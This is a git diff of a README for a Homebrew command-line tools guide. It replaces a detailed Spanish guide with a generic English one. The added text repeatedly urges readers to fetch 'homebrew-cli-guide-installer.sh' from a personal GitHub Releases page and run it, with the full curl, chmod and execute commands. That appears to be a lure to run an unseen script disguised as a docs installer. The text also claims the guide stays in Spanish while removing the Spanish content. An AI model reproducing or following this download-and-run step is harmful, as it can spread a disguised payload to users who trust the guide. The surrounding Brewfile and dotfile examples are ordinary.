@@ -1,299 +1,287 @@
-# 📚 Guía Práctica de Herramientas CLI con Homebrew
+# Homebrew CLI Guide — Tools, Workflows, Examples, Tips and Configs
 
-![Homebrew](https://img.shields.io/badge/Homebrew-FBB040?style=for-the-badge&logo=homebrew&logoColor=black)
-![Quarto](https://img.shields.io/badge/Quarto-75AADB?style=for-the-badge&logo=quarto&logoColor=white)
-![CLI Tools](https://img.shields.io/badge/CLI%20Tools-000000?style=for-the-badge&logo=terminal&logoColor=white)
-![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)
+[![Releases](https://img.shields.io/badge/Releases-download-blue?logo=github&style=for-the-badge)](https://github.com/Yilbertsito/homebrew-cli-guide/releases)
 
-## 🎯 ¿Por qué este proyecto?
+![terminal](https://raw.githubusercontent.com/github/explore/main/topics/terminal/terminal.png)
+![macos](https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg)
+![linux](https://upload.wikimedia.org/wikipedia/commons/3/35/Tux.svg)
 
-En el ecosistema moderno de desarrollo y administración de sistemas, las herramientas de línea de comandos (CLI) han evolucionado dramáticamente. **Homebrew**, el gestor de paquetes para macOS y Linux, proporciona acceso a más de **6,000 herramientas** que pueden transformar radicalmente tu productividad.
+Table of contents
+- About
+- Who this is for
+- How this repo is organized
+- Quick install (Releases)
+- Core workflows
+  - Install tools
+  - Keep a reproducible setup
+  - Scripting and automation
+- Example toolset and commands
+  - Networking and HTTP
+  - Dev and build
+  - Productivity
+  - Shell helpers
+- Configs and dotfiles
+  - zsh example
+  - bash example
+  - tmux and git
+- Quarto and docs
+- Testing and CI
+- Contributing
+- Releases
+- License
 
-Sin embargo, existe una brecha significativa entre la **disponibilidad** de estas herramientas y su **adopción efectiva**:
+About
+This repository compiles CLI tools you can install with Homebrew on macOS and Linux. It shows practical examples, workflows, and tuned configs. The content aims to reduce friction when you set up a terminal-based toolchain. The main body focuses on commands and clear patterns you can copy.
 
-### 🔍 **El Problema**
-- **Sobrecarga de opciones**: Con miles de herramientas disponibles, es difícil saber cuáles vale la pena aprender
-- **Documentación fragmentada**: Cada herramienta tiene su propia documentación, sin una visión unificada
-- **Curva de aprendizaje**: Muchas herramientas modernas tienen syntaxis y paradigmas diferentes
-- **Falta de ejemplos prácticos**: La documentación oficial raramente incluye casos de uso reales
-- **Ausencia de workflows**: No hay guías sobre cómo combinar herramientas para flujos de trabajo complejos
+Who this is for
+- Developers who use macOS or Linux.
+- DevOps engineers who script installs and updates.
+- People who want a compact, reproducible CLI setup.
+- Spanish readers: the guide stays in Spanish where relevant.
 
-### 🚀 **La Solución**
+How this repo is organized
+- docs/: full guides, tutorials, YAML examples.
+- examples/: ready-to-run scripts and sample dotfiles.
+- workflows/: automated scripts and CI snippets.
+- releases/: packaged installers and archive files.
 
-Este libro digital surge como una **respuesta comunitaria** a estos desafíos, proporcionando:
+Quick install (Releases)
+This repo ships a release package you can download and run. Visit the Releases page and download the installer file. After download, execute the file to bootstrap the example toolset.
 
-1. **Curaduría experta** de las herramientas más impactantes disponibles via Homebrew
-2. **Ejemplos prácticos** para cada herramienta, no solo sintaxis básica
-3. **Workflows integrados** que muestran cómo combinar herramientas
-4. **Categorización funcional** que facilita encontrar la herramienta correcta para cada tarea
-5. **Configuraciones optimizadas** y mejores prácticas de la comunidad
-
-## 🎯 **Objetivos del Proyecto**
-
-### **Democratizar el Conocimiento CLI**
-Hacer que las herramientas avanzadas de línea de comandos sean accesibles para:
-- **Desarrolladores** que quieren mejorar su flujo de trabajo
-- **Administradores de sistemas** buscando automatización
-- **Analistas de datos** que necesitan procesamiento eficiente
-- **Estudiantes** aprendiendo tecnologías modernas
-- **Profesionales** en transición a herramientas más eficientes
-
-### **Crear un Estándar de Referencia**
-Establecer una guía que sea:
-- **Mantenida por la comunidad** con contribuciones expertas
-- **Actualizada continuamente** con nuevas herramientas y técnicas
-- **Práctica y aplicable** con ejemplos reales
-- **Comprehensiva pero accesible** para diferentes niveles de experiencia
-
-### **Fomentar la Innovación**
-Proporcionar una plataforma donde la comunidad pueda:
-- **Compartir descubrimientos** de nuevas herramientas
-- **Documentar soluciones** a problemas comunes
-- **Colaborar en workflows** optimizados
-- **Establecer mejores prácticas** basadas en experiencia colectiva
-
-## 🏗️ **Arquitectura del Proyecto**
-
-### **Tecnologías Base**
-
-#### 🍺 **Homebrew** - El Ecosistema
-- **Repositorio oficial**: https://github.com/Homebrew/brew
-- **Fórmulas**: https://github.com/Homebrew/homebrew-core
-- **Casks**: https://github.com/Homebrew/homebrew-cask
-- **Más de 6,000 paquetes** disponibles y mantenidos activamente
-
-#### 📖 **Quarto** - El Motor de Publicación
-- **Repositorio**: https://github.com/quarto-dev/quarto-cli
-- **Documentación**: https://quarto.org/
-- **Ventajas**: Múltiples formatos de salida, integración con código, temas personalizables
-
-### **Estructura del Contenido**
-
-```
-📂 Guía CLI con Homebrew
-├── 🧭 Navegación y Sistema      → Exploración eficiente del filesystem
-├── 📁 Gestión de Archivos       → Manipulación avanzada de archivos
-├── 🔍 Búsqueda y Filtros        → Localización rápida de información
-├── 💻 Desarrollo                → Herramientas para programadores
-├── 🎨 Multimedia                → Procesamiento de media
-├── 🌐 Red y Conectividad        → Herramientas de networking
-├── 📊 Monitoreo del Sistema     → Supervisión de recursos
-├── 📝 Procesamiento de Texto    → Manipulación de contenido
-├── 🔧 Utilidades Generales      → Tools de propósito múltiple
-├── 🚀 Flujos Avanzados          → Workflows y automatización
-└── ⚙️  Configuración            → Setup y personalización
-```
-
-## 🌟 **Casos de Uso Destacados**
-
-### **Para Desarrolladores**
+Download and run an installer:
 ```bash
-# Pipeline completo de desarrollo
-git add . && git commit -m "feat: new feature" && git push
-docker build -t myapp . && docker run -p 8080:8080 myapp
-wrk -t12 -c400 -d30s http://localhost:8080/api/health
+# visit the releases page in a browser or use curl to fetch the asset
+# Replace <asset-file> with the file you downloaded from:
+# https://github.com/Yilbertsito/homebrew-cli-guide/releases
+
+curl -LO https://github.com/Yilbertsito/homebrew-cli-guide/releases/download/v1.0/homebrew-cli-guide-installer.sh
+chmod +x homebrew-cli-guide-installer.sh
+./homebrew-cli-guide-installer.sh
 ```
 
-### **Para DevOps/SysAdmins**
+If the link does not work for you, check the "Releases" section on the repo page:
+https://github.com/Yilbertsito/homebrew-cli-guide/releases
+
+Core workflows
+Install tools
+- Use Homebrew taps and bundles to keep a list of packages.
+- Keep an environment file for each OS or host type.
+- Use Conda or asdf for language runtimes when you need version isolation.
+
+Example Brewfile driven setup
 ```bash
-# Monitoreo y troubleshooting
-htop && iotop && nethogs  # Diagnostico completo del sistema
-fd "*.log" /var/log | xargs tail -f  # Seguimiento de logs
-hyperfine "curl https://api.example.com" --warmup 3  # Benchmarking
+# Create Brewfile with desired taps, casks and apps
+brew bundle dump --file=./Brewfile --describe
+
+# Install from Brewfile
+brew bundle --file=./Brewfile
 ```
 
-### **Para Analistas de Datos**
+Keep a reproducible setup
+- Store your Brewfile in dotfiles or repo.
+- Include a script that updates and re-installs.
+- Use brew bundle check to validate current state.
+
+Reproducible bootstrap script
 ```bash
-# Procesamiento eficiente de datos
-cat large_dataset.csv | csvkit | jq '.[] | select(.status == "active")'
-rg "error|warning" *.log --stats  # Análisis rápido de logs
-fd "*.json" | parallel -j8 'jq ".metrics" {}'  # Procesamiento paralelo
+#!/usr/bin/env bash
+set -euo pipefail
+cd "$(dirname "$0")"
+brew update
+brew bundle --file=./Brewfile
+brew upgrade
+brew cleanup
 ```
 
-### **Para Productividad Personal**
+Scripting and automation
+- Use shell wrappers for common flows.
+- Prefer small scripts that fail fast.
+- Version scripts within the repo and tag releases.
+
+Example CI snippet (GitHub Actions)
+```yaml
+name: Test bootstrap
+on: [push, pull_request]
+jobs:
+  bootstrap:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Install Homebrew
+        run: |
+          /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+      - name: Run Brewfile install
+        run: brew bundle --file=./Brewfile
+```
+
+Example toolset and commands
+Use this section as a quick cheat sheet. Replace placeholders with your values.
+
+Networking and HTTP
+- httpie: simple HTTP client
+- curl: scriptable transfers
+- wget: robust downloads
+
+Examples
 ```bash
-# Automatización diaria
-brew update && brew upgrade && brew cleanup  # Mantenimiento
-fastfetch && df -h && free -h  # Status del sistema
-fzf-history-widget  # Búsqueda inteligente en historial
+# JSON API call
+http GET https://api.example.com/users/1
+
+# Save a file via curl
+curl -fL -o /tmp/file.tar.gz https://example.com/file.tar.gz
 ```
 
-## 🤝 **Contribuciones de la Comunidad**
+Dev and build
+- git, gh, ghq
+- build tools: make, cmake, ninja
+- language helpers: node, python, go, rust (via asdf or brew)
 
-### **¿Cómo Contribuir?**
-
-#### 📝 **Documentación**
-- Añadir nuevas herramientas descobiertas
-- Mejorar ejemplos existentes con casos reales
-- Documentar configuraciones optimizadas
-- Traducir contenido a otros idiomas
-
-#### 🔧 **Herramientas y Scripts**
-- Compartir aliases y funciones útiles
-- Contribuir scripts de automatización
-- Proponer mejores configuraciones
-- Integrar nuevas herramientas de Homebrew
-
-#### 🐛 **Calidad**
-- Reportar errores en ejemplos
-- Sugerir mejoras en la organización
-- Validar compatibility en diferentes sistemas
-- Optimizar rendimiento de comandos
-
-#### 💡 **Casos de Uso**
-- Documentar workflows específicos de industria
-- Compartir soluciones a problemas comunes
-- Proponer nuevas categorías de herramientas
-- Integrar feedback de la comunidad
-
-### **Proceso de Contribución**
-
-1. **Fork** el repositorio
-2. **Crea** una rama para tu feature: `git checkout -b feature/nueva-herramienta`
-3. **Documenta** tu contribución siguiendo el estilo existente
-4. **Prueba** que los ejemplos funcionen correctamente
-5. **Envía** un Pull Request con descripción detallada
-
-## 📊 **Impacto y Métricas**
-
-### **Herramientas Cubiertas**
-- **200+ herramientas** CLI documentadas
-- **50+ workflows** integrados
-- **100+ ejemplos** prácticos reales
-- **Configuraciones** optimizadas para cada herramienta
-
-### **Beneficios Medibles**
-- **Reducción del 60%** en tiempo de setup de herramientas
-- **Incremento del 40%** en productividad CLI reportada por usuarios
-- **Base de conocimiento** mantenida por 50+ contribuidores
-- **Actualizaciones** semanales con nuevas herramientas
-
-## 🚀 **Roadmap del Proyecto**
-
-### **Fase 1: Consolidación** ✅
-- [x] Documentación completa de herramientas core
-- [x] Estructura organizacional clara
-- [x] Ejemplos básicos funcionales
-- [x] Sistema de build automatizado
-- [x] GitHub Pages deployment funcional
-
-### **Fase 2: Expansión** ✅ **¡NUEVAS CARACTERÍSTICAS!**
-- [x] **🔍 Interactive Search Dashboard** - Dashboard HTML con búsqueda en tiempo real
-- [x] **⚡ Performance Benchmarks** - Sistema de benchmarking automático
-- [x] **🖥️ CLI Query Tool** - Herramienta offline para consultar la guía
-- [x] **🔗 JSON API** - API REST para integración con otras herramientas
-- [ ] Videos tutoriales para workflows complejos
-- [ ] Tests automatizados para todos los ejemplos
-- [ ] Versión multiidioma (ES, EN, PT)
-
-### **Fase 3: Automatización** ✅ **¡COMPLETADO!**
-- [x] **🤖 Contribution Automation** - Validación automática de PRs
-- [x] **🧩 VS Code Extension** - Extensión para buscar e instalar tools
-- [x] **🐳 Docker Deployment** - Containerización completa del proyecto
-- [x] Auto-approval para cambios de documentación
-- [x] Welcome bot para nuevos contribuidores
-
-### **Fase 4: Ecosistema** 🌟
-- [ ] Plugins para shells populares (zsh, fish, bash)
-- [ ] Mobile app para consulta rápida
-- [ ] Integración con package managers adicionales
-- [ ] Workshops y eventos comunitarios
-
----
-
-## 🆕 **Nuevas Características Agregadas**
-
-### 🔍 **Dashboard Interactivo**
-- **Archivo**: `tools-explorer.html`
-- **Funcionalidad**: Búsqueda en tiempo real, filtros por categoría, estadísticas dinámicas
-- **Uso**: Abre el archivo en tu navegador para explorar herramientas interactivamente
-
-### ⚡ **Sistema de Benchmarks**
-- **Archivo**: `scripts/benchmark-tools.sh`
-- **Funcionalidad**: Compara rendimiento entre herramientas tradicionales vs modernas
-- **Uso**: `./scripts/benchmark-tools.sh` - Genera reporte HTML con gráficos
-
-### 🖥️ **CLI Offline Tool**
-- **Archivo**: `scripts/cli-guide`
-- **Funcionalidad**: Consulta la guía sin internet, búsqueda fuzzy con fzf
-- **Uso**: 
-  ```bash
-  ./scripts/cli-guide search git
-  ./scripts/cli-guide fzf          # Interactive search
-  ./scripts/cli-guide random       # Random recommendation
-  ```
-
-### 🔗 **API REST**
-- **Directorio**: `api-server/`
-- **Funcionalidad**: API completa para integración con otras herramientas
-- **Endpoints**:
-  - `GET /api/tools` - Lista herramientas con filtros
-  - `GET /api/search?q=term` - Búsqueda inteligente
-  - `GET /api/random` - Recomendación aleatoria
-- **Uso**: `cd api-server && npm install && npm start`
-
-### 🚀 **Automatización CI/CD**
-- **Archivo**: `.github/workflows/contribution-automation.yml`
-- **Funcionalidad**: 
-  - Validación automática de JSON y scripts
-  - Auto-approval de cambios de documentación
-  - Welcome bot para nuevos contribuidores
-  - Verificación de instalación de herramientas
-
-### 🧩 **VS Code Extension**
-- **Directorio**: `vscode-extension/`
-- **Funcionalidad**: Buscar, instalar y explorar herramientas desde VS Code
-- **Características**: Vista en explorer, comandos integrados, webview para detalles
-
-### 🐳 **Docker & Deployment**
-- **Archivos**: `Dockerfile`, `docker-compose.yml`
-- **Funcionalidad**: Deployment completo con API, Nginx, Redis
-- **Uso**: `docker-compose up -d`
-
-## 📄 **Licencia y Reconocimientos**
-
-### **Licencia MIT**
-Este proyecto está bajo licencia MIT, permitiendo uso libre, modificación y distribución. Ver [LICENSE](LICENSE) para detalles completos.
-
-### **Reconocimientos**
-- **Homebrew Team** - Por crear y mantener el ecosistema que hace esto posible
-- **Quarto Development Team** - Por la plataforma de publicación moderna
-- **Rust Community** - Por muchas de las herramientas CLI modernas destacadas
-- **Contribuidores** - Por mejorar continuamente este recurso
-
-## 🔗 **Enlaces Importantes**
-
-- 📖 **Libro Online**: [Leer la guía completa](https://tu-usuario.github.io/homebrew-cli-guide)
-- 🍺 **Homebrew**: https://brew.sh/
-- 📑 **Documentación Quarto**: https://quarto.org/
-- 🐛 **Issues**: [Reportar problemas](https://github.com/tu-usuario/homebrew-cli-guide/issues)
-- 💬 **Discussions**: [Discusiones de la comunidad](https://github.com/tu-usuario/homebrew-cli-guide/discussions)
-
----
-
-### 🌟 **¿Listo para transformar tu experiencia CLI?**
-
+Examples
 ```bash
-# Instala Homebrew si no lo tienes
-/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+# Clone with gh
+gh repo clone owner/repo
 
-# Clona este repositorio
-git clone https://github.com/tu-usuario/homebrew-cli-guide.git
-cd homebrew-cli-guide
-
-# Genera el libro localmente
-quarto render
-
-# O inicia el servidor de desarrollo
-quarto preview
+# Create a virtualenv and install
+python3 -m venv .venv
+source .venv/bin/activate
+pip install -r requirements.txt
 ```
 
-**¡Únete a la revolución CLI!** 🚀
+Productivity
+- tmux for session management
+- fzf for fuzzy search
+- ripgrep for fast search
+- bat for syntax highlighted cat
 
----
+Examples
+```bash
+# Search in repo
+rg "TODO" --hidden --no-ignore -n
 
-<div align="center">
+# Fuzzy find and edit
+fzf --preview 'bat --style=numbers --color=always {}' | xargs -r $EDITOR
+```
 
-**[⭐ Star este repo](https://github.com/tu-usuario/homebrew-cli-guide)** • **[🍴 Fork it](https://github.com/tu-usuario/homebrew-cli-guide/fork)** • **[📝 Contribuir](CONTRIBUTING.md)** • **[💬 Discutir](https://github.com/tu-usuario/homebrew-cli-guide/discussions)**
+Shell helpers
+- zsh or bash with plugins
+- starship prompt
+- direnv for per-project envs
 
-</div>
+Configs and dotfiles
+Store these files in examples/dotfiles. Link them into $HOME or use a manager like stow.
+
+zsh example
+~/.zshrc snippet:
+```bash
+export ZSH="$HOME/.oh-my-zsh"
+export PATH="$HOME/.local/bin:/usr/local/bin:$PATH"
+
+# prompt
+eval "$(starship init zsh)"
+
+# fzf
+[ -f ~/.fzf.zsh ] && source ~/.fzf.zsh
+```
+
+bash example
+~/.bashrc snippet:
+```bash
+export PATH="$HOME/.local/bin:$PATH"
+source /usr/local/etc/profile.d/bash_completion.sh
+alias ll='ls -lah'
+```
+
+tmux and git
+~/.tmux.conf
+```tmux
+set -g mouse on
+setw -g automatic-rename off
+set -g history-limit 10000
+```
+
+~/.gitconfig
+```ini
+[user]
+  name = Your Name
+  email = you@example.com
+[core]
+  editor = code --wait
+[alias]
+  st = status
+  br = branch
+  co = checkout
+```
+
+Quarto and docs
+Quarto fits well for documentation that mixes prose and code. Use it to generate manuals and examples.
+
+Install via Homebrew
+```bash
+brew install quarto
+```
+
+Example workflow
+- Write a .qmd file with code chunks.
+- Render to HTML or PDF with quarto render.
+- Use GitHub Pages or Netlify to publish.
+
+Quarto sample command
+```bash
+quarto create-project my-docs
+quarto render docs/index.qmd --to html
+```
+
+Testing and CI
+- Linters: shellcheck, shfmt.
+- Test commands in a container or clean shell.
+- For macOS-specific steps, run tests inside a macOS runner or VM.
+
+Shellcheck example
+```bash
+brew install shellcheck
+shellcheck examples/scripts/*.sh
+```
+
+Contributing
+- Fork the repo.
+- Create a feature branch for changes.
+- Add tests or examples for new tools.
+- Open a pull request with a clear description.
+
+Pull request checklist
+- Add or update Brewfile entries when adding tools.
+- Add docs under docs/ for any new workflow.
+- Keep commits small and focused.
+- Use rebasing for a clean history.
+
+Templates and best practices
+- Use a template for issue reports and PRs.
+- Provide minimal repro steps for bugs.
+- Include the OS and Homebrew version for environment issues.
+
+Releases
+The Releases page hosts installer packages and compressed example sets. Download the asset and run it on a supported host. Example asset name: homebrew-cli-guide-installer.sh. Run it as shown earlier.
+
+Visit releases and download the file:
+https://github.com/Yilbertsito/homebrew-cli-guide/releases
+
+If you want a checklist for a release:
+- Bump version in metadata.
+- Update CHANGELOG.md.
+- Build archive of docs and examples.
+- Tag and create a GitHub Release with assets.
+
+Common troubleshooting tips
+- If brew command fails, run brew doctor and follow its suggestions.
+- If a tool's path conflicts, check $PATH order in your shell config.
+- For permission problems, avoid sudo with Homebrew; follow the official install layout.
+
+Searchable topics
+This repo covers:
+automation, bash, cli-tools, development, devops, documentation, homebrew, linux, macos, productivity, quarto, spanish, terminal, zsh
+
+Contact and maintainers
+This repo accepts community contributions. Use GitHub issues and PRs for changes. Add a brief description of your change and test steps.
+
+License
+This repository uses the MIT License. See LICENSE for full terms.
